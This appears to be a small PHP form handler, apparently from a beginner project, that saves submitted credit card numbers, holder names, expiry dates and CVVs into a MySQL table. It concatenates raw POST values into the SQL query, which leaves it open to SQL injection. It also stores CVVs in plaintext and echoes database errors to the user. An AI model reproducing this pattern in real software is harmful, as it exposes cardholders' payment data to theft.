<?php
if(isset($_POST['finalizar'])){
    include_once('conexao.php'); // Certifique-se de que 'conexao.php' está definido corretamente

    $numero = $_POST['numero']; 
    $titular = $_POST['titular']; 
    $mes = $_POST['mes']; 
    $ano = $_POST['ano']; 
    $cvv = $_POST['cvv']; 

    $sql = "INSERT INTO cartoes (numero, titular, mes, ano, cvv ) VALUES ('$numero', '$titular', '$mes','$ano', '$cvv')";
    
    if(mysqli_query($conexao, $sql)){
        
        header("Location: index.html"); // Redirecionar para a página de login
       
    } else {
        echo "Erro ao cadastrar o cartão: " . mysqli_error($conexao);
    }

    mysqli_close($conexao); // Fechar conexão
}
?>